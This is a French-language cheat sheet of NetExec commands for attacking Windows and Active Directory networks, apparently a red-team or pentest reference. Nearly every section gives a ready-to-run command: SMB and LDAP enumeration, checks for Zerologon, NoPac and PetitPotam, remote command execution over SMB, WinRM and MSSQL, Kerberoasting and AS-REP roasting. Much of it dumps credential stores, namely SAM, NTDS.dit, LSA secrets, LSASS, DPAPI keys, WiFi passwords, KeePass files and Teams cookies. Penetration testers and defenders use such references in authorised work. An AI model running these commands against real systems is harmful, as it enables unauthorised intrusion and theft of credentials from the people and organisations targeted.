https://github.com/Pennyw0rth/NetExec

### 🗄️ SMB (Server Message Block)

#### Usage de base (connexion anonyme)

```bash
netexec smb $ip -u "" -p ""
```

Effectue une connexion SMB sans authentification.

#### Connexion en authentification locale

```bash
netexec smb $ip -u "" -p "" --local-auth
```

Tente une connexion avec des identifiants stockés localement sur la machine cible.

#### Connexion avec un ticket Kerberos (.ccache)

```bash
export KRB5CCNAME=/fichier/truc.ccache
netexec smb $ip --use-kcache
```

Utilise un ticket Kerberos existant pour l’authentification.

---
### 🔎 Enumération SMB

#### Vérifier si un contrôleur de domaine est vulnérable (PetitPotam, NoPac, Zerologon)

```bash
netexec smb $ip -u "" -p "" -M Petitpotam
netexec smb $ip -u "" -p "" -M NoPac
netexec smb $ip -u "" -p "" -M zerologon
```

Teste différentes attaques connues sur le DC.

#### Enumérer les hôtes sur un réseau

```bash
netexec smb 192.168.0.0/24
```

Recherche tous les hôtes accessibles via SMB sur le réseau.

#### Enumération des utilisateurs sur un hôte ou un DC

```bash
netexec smb $ip -u "" -p "" --users
```

Récupère la liste des utilisateurs disponibles.

#### Enumération des partages SMB disponibles

```bash
netexec smb $ip -u "" -p "" --shares
```

Affiche tous les partages accessibles sur l’hôte cible.

#### Enumération des groupes d’utilisateurs

```bash
netexec smb $ip -u "" -p "" --groups
```

Affiche les groupes d’utilisateurs du système cible.

#### Enumération des disques durs accessibles

```bash
netexec smb $ip -u "" -p "" --disks
```

Liste les disques montés et accessibles.

#### Enumération des utilisateurs connectés

```bash
netexec smb $ip -u "" -p "" --loggedon-users
```

Affiche la liste des sessions actives.

#### Enumérer la politique de mot de passe

```bash
netexec smb $ip -u "" -p "" --pass-pol
```

Récupère la politique de mot de passe du domaine.

#### Vérifier si le service "Spooler" est actif

```bash
netexec smb $ip -u "" -p "" -M spooler
```

Teste la présence du service **Spooler** pour les attaques **PrintNightmare**.

#### Vérifier si le service "WebDAV" est actif

```bash
netexec smb $ip -u "" -p "" -M webdav
```

Teste la présence du service WebDAV, souvent utilisé pour l’exploitation d’accès distants.

---
### 💻 Exécution de commandes via SMB

#### Exécuter une commande via WMI, AT, ou SMB

```bash
netexec smb $ip -u "" -p "" -x whoami
```

Exécute une commande en utilisant les services Windows.

---
### 🗃️ Accès aux fichiers partagés (Samba)

#### Exploration des partages SMB

```bash
netexec smb $ip -u "" -p "" --spider
netexec smb $ip -u "" -p "" -M spider_plus
```

Recherche récursivement les fichiers accessibles sur les partages.

#### Dump de tous les fichiers d’un partage

```bash
netexec smb $ip -u "" -p "" -M spider_plus -o READ_ONLY=false
```

Télécharge tous les fichiers accessibles sur un partage donné.

---
### 💰 Upload / Download de fichiers via SMB

#### Télécharger un fichier distant

```bash
netexec smb $ip -u "" -p "" --get-file \\Windows\\Temps\\test.txt /dossier/local/test.txt
```

Copie un fichier depuis l’hôte distant vers la machine locale.

#### Uploader un fichier

```bash
netexec smb $ip -u "" -p "" --put-file \\Windows\\Temps\\test.txt /dossier/local/test.txt
```

Copie un fichier depuis la machine locale vers l’hôte distant.

---
### 😱 Dump d’informations sensibles

#### Dumper le fichier SAM

```bash
netexec smb $ip -u "" -p "" --sam
```

Récupère les hash NTLM des comptes locaux.

#### Dumper la base NTDS (Active Directory)

```bash
netexec smb $ip -u "" -p "" --ntds
```

Exfiltre la base **NTDS.dit** qui contient les hash NTLM des comptes du domaine.

#### Dumper les secrets LSA

```bash
netexec smb $ip -u "" -p "" --lsa
```

Extrait les secrets stockés par **LSA**, y compris les clés et mots de passe système.

#### Dumper LSASS (mots de passe en clair)

```bash
netexec smb $ip -u "" -p "" -M lsassy
```

Tente d’extraire les identifiants stockés en mémoire via LSASS.

#### Récupérer les mots de passe WiFi

```bash
netexec smb $ip -u "" -p "" -M wireless
```

Récupère les mots de passe des réseaux WiFi stockés sur la machine.

#### Recherche de fichiers Keepass

```bash
netexec smb $ip -u "" -p "" -M keepass_discover
netexec smb $ip -u "" -p "" -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```

Détecte et tente d'exploiter des bases de mots de passe **Keepass**.

#### Dumper les clés DPAPI

```bash
netexec smb $ip -u "" -p "" --dpapi
```

Extrait les clés utilisées par **DPAPI** pour protéger des secrets.

#### Dumper les cookies Teams

```bash
netexec smb $ip -u "" -p "" -M teams_localdb
```

Extrait les cookies d'authentification de Microsoft Teams.

---
### 📔 Attaques LDAP

#### Asreproasting

```bash
netexec ldap $ip -u "" -p "" --asreproast output.txt
```

Récupère les tickets Kerberos **TGT sans pré-authentification**, exploitables par **AS-REP Roasting**.

#### Kerberoasting

```bash
netexec ldap $ip -u "" -p "" --kerberoasting output.txt
```

Récupère les tickets **Kerberos TGS** des services pour les attaquer hors ligne.

#### Détection de l’Unconstrained Delegation

```bash
netexec ldap $ip -u "" -p "" --trusted-to-delegate
```

Détecte les comptes ayant des permissions **Unconstrained Delegation**.

#### Enumération des quotas de compte machine

```bash
netexec ldap $ip -u "" -p "" -M maq
```

Recherche les paramètres de quotas liés aux **comptes machines**.

#### Lister les descriptions des utilisateurs

```bash
netexec ldap $ip -u "" -p "" -M users_desc
```

Affiche les descriptions des comptes utilisateurs.

---
### 💻 Exploitation RDP (Remote Desktop Protocol)

#### Prendre un screenshot via RDP

```bash
netexec rdp <ip> -u <user> -p <password> --screenshot --screentime <second>
```

Capture un **screenshot** de la session RDP distante.

---
### 💻 Exploitation WINRM (Windows Remote Management)

#### Exécuter une commande sur une cible WINRM

```bash
netexec winrm 192.168.255.131 -u user -p 'password' -X whoami
```

Exécute **whoami** via **WINRM** sur la cible.

---
### 🗄️ Exploitation MSSQL

#### Escalade de privilèges sur MSSQL

```bash
netexec mssql <ip> -u user -p password -M mssql_priv
```

Teste l’exploitation des privilèges MSSQL.

#### Exécution de commandes sur MSSQL

```bash
netexec mssql 10.10.10.52 -u admin -p 'password' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

Exécute une requête SQL directement sur MSSQL.
